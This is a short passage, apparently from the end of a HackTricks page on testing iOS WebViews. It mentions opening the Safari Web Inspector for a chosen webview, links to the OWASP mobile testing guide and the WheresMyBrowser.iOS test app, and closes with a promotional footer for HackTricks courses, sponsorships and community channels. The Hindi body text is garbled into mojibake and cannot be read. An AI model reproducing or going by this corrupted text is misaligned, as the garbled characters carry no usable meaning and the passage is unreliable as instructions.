* рдЙрд╕ webview рдХреЗ рдбреНрд░реЙрдкрдбрд╛рдЙрди рд╡рд┐рдХрд▓реНрдк рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдЬрд┐рд╕реЗ рдЖрдк рдбрд┐рдмрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред рдЗрд╕рд╕реЗ рд╡реЗрдмрд╡реНрдпреВ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдПрдХ рдирдИ Safari Web Inspector рд╡рд┐рдВрдбреЛ рдЦреБрд▓реЗрдЧреАред

![Safari Web Inspector window](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-inspector.jpg)

## рд╕рдВрджрд░реНрдн

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
